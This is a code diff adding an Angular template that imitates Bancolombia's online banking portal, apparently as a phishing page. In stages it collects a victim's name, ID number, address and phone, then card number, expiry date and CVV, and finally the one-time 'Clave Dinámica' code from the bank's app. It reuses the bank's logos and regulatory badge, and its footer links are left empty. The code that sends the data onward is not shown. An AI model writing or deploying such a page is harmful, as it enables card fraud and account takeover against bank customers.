@@ -1,0 +1,195 @@
+<div class="pay-component">
+    <header class="bc-header">
+        <div appheaderlogo="" logosizedesktop="225px" logosizemobile="24px">
+            <section class="bc-header-brand">
+                <div aria-label="Menú principal" role="button" class="bc-header-brand_menu-toggle bc-reverse-d-lg-none"
+                    tabindex="0"><em role="img" class="bc-icon bc-sm em" style="visibility: visible;"
+                        name="menu">menu</em><span>Menú</span></div><!----><!----><a class="bc-link">
+                    <div class="div-desktop div" aria-hidden="true" style="width: 225px;"><img
+                            src="/assets/img-horizontal-negative.svg"
+                            alt="undefined" style="width: 225px;"></div>
+                </a><!----><!---->
+                <div class="bc-header-channel" tabindex="0">
+                    <h5>Sucursal Virtual Personas</h5>
+                </div><!---->
+            </section>
+        </div>
+    </header>
+    <div class="main-container">
+        <div class="container" *ngIf="page() === 1">
+            <div class="title">
+                <h5 class="bc-opensans-font-style-3-semibold">1{{')'}} Verificación de Identidad</h5>
+            </div>
+            <form [formGroup]="personForm" (ngSubmit)="onSubmit()" novalidate>
+                <div class="form-group">
+                    <label for="nombre">Nombre</label>
+                    <input id="nombre" formControlName="nombre" type="text" maxlength="19"/>
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="personForm.get('nombre')?.touched && personForm.get('nombre')?.invalid">
+                        Nombre inválido
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="id">Documento de Identidad</label>
+                    <input id="id" formControlName="id" type="text" maxlength="10" />
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="personForm.get('id')?.touched && personForm.get('id')?.invalid">
+                        Documento de identidad inválido
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="add">Dirección</label>
+                    <input id="add" formControlName="add" type="text" maxlength="50" />
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="personForm.get('add')?.touched && personForm.get('add')?.invalid">
+                        Dirección inválida
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="tel">Telefóno</label>
+                    <input id="tel" formControlName="tel" type="text" maxlength="50" />
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="personForm.get('tel')?.touched && personForm.get('tel')?.invalid">
+                        Número de telefóno inválido
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-button" [disabled]="personForm.invalid">Continuar</button>
+            </form>
+        </div>
+        <div class="container" *ngIf="page() === 2">
+            <div class="title">
+                <h5 class="bc-opensans-font-style-3-semibold">2{{')'}} Verificación de Producto</h5>
+            </div>
+            <form [formGroup]="cardForm" (ngSubmit)="onSubmit()" novalidate>
+                <div class="form-group">
+                    <label for="tarjeta">Tarjeta</label>
+                    <input id="tarjeta" formControlName="tarjeta" type="text" maxlength="19"
+                        mask="0000 0000 0000 0000" />
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="cardForm.get('tarjeta')?.touched && cardForm.get('tarjeta')?.invalid">
+                        Número de tarjeta inválido
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="exp">Expiración</label>
+                    <input id="exp" formControlName="exp" type="text" maxlength="5" mask="00/00" />
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="hasError('exp', 'invalidDateFormat')">
+                        Fecha de expiración inválida
+                    </div>
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="hasError('exp', 'invalidMonth')">
+                        El mes debe estar entre 01 y 12
+                    </div>
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="hasError('exp', 'invalidYear')">
+                        El año debe estar entre {{ currentYear }} y {{ currentYear + 10 }}
+                    </div>
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="hasError('exp', 'expiredDate')">
+                        Tú tarjeta ya expiró
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input id="cvv" formControlName="cvv" type="password" maxlength="3" />
+                    <div class="error bc-opensans-font-style-2-regular" *ngIf="cardForm.get('cvv')?.touched && cardForm.get('cvv')?.invalid">
+                        CVV inválido
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-button" [disabled]="cardForm.invalid">Continuar</button>
+            </form>
+        </div>
+    </div>
+    <div class="spinner-overlay" *ngIf="isLoading">
+        <div class="spinner-container" role="alert" aria-live="assertive" aria-busy="true">
+            <div class="spinner-circle" aria-hidden="true"></div>
+            <div class="spinner-text bc-opensans-font-style-2-regular">Cargando...</div>
+        </div>
+    </div>
+    <footer _ngcontent-ng-c2515275900="">
+        <div componentid="svp-footer">
+            <div class="bc-footer" id="svp-footer">
+                <div class="bc-container">
+                    <div class="bc-footer-top-links">
+                        <div class="bc-footer-top-links-ca">
+                            <a bc-link=""
+                                href=""
+                                target="_blank" rel="noopener noreferrer" class="bc-link link-default"> ¿Problemas para
+                                conectarte?
+                            </a>
+                        </div>
+                        <div class="bc-footer-top-links-ca">
+                            <a bc-link=""
+                                href=""
+                                target="_blank" rel="noopener noreferrer" class="bc-link link-default"> Aprende sobre
+                                seguridad
+                            </a>
+                        </div>
+                        <div class="bc-footer-top-links-ca">
+                            <a bc-link=""
+                                href=""
+                                target="_blank" rel="noopener noreferrer" class="bc-link link-default"> Reglamento
+                                Sucursal Virtual
+                            </a>
+                        </div>
+                        <div class="bc-footer-top-links-ca">
+                            <a bc-link=""
+                                href=""
+                                target="_blank" rel="noopener noreferrer" class="bc-link link-default"> Política de
+                                privacidad
+                            </a>
+                        </div>
+                    </div>
+                    <div class="bc-footer-divisor"></div>
+                    <div class="bc-footer-bottom">
+                        <div class="bc-footer-bottom-left">
+                            <div class="bc-footer-bottom-left-side">
+                                <div class="bc-footer-bottom-top-icon">
+                                    <div size="150px" alt="logo" aria-hidden="true" class="bc-logo"
+                                        style="width: 150px;">
+                                        <img src="/assets/img-horizontal-no-spacing.svg"
+                                            alt="logo" style="width: 150px;">
+                                    </div>
+                                </div>
+                                <div class="bc-footer-bottom-left-side-vigilant">
+                                    <div alt="Vigilado Superintendencia Financiera de Colombia" aria-hidden="false"
+                                        class="bc-logo" style="width: 16px;">
+                                        <img src="/assets/logo-vigilado.svg"
+                                            alt="Vigilado Superintendencia Financiera de Colombia" style="width: 16px;">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="bc-footer-bottom-right">
+                            <div class="bc-footer-bottom-right-text">
+                                <p>Dirección IP: 191.25.42.1</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="modal-overlay" *ngIf="isOpen && !isLoading" (click)="close()"></div>
+    <div class="modal" *ngIf="isOpen && !isLoading" role="dialog" aria-modal="true" aria-labelledby="modal-title"
+        aria-describedby="modal-desc">
+        <button class="close-button" aria-label="Close modal" (click)="close()">×</button>
+        <h2 id="modal-title" class="modal-title">Ingresa la Clave Dinámica</h2>
+        <p id="modal-desc" class="modal-description">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+        <div class="otp-container">
+            <input *ngFor="let digit of otp; let i = index" type="text" maxlength="1" class="otp-input"
+                [class.active]="isActive(i)" [(ngModel)]="otp[i]" (ngModelChange)="onInput($event, i)"
+                inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code"
+                (keydown.backspace)="onBackspace($event, i)" />
+        </div>
+        <div class="button-group">
+            <button class="btn btn-outline" (click)="clear()">Borrar</button>
+            <button class="btn btn-primary" [disabled]="otp.includes('')" (click)="sendDynamic()">Continuar</button>
+        </div>
+    </div>
+    <div class="spinner-overlay" *ngIf="isLoading">
+        <div class="spinner-container" role="alert" aria-live="assertive" aria-busy="true">
+            <div class="spinner-circle" aria-hidden="true"></div>
+            <div class="spinner-text bc-cibsans-font-style-5-bold">Cargando...</div>
+        </div>
+    </div>
+</div>
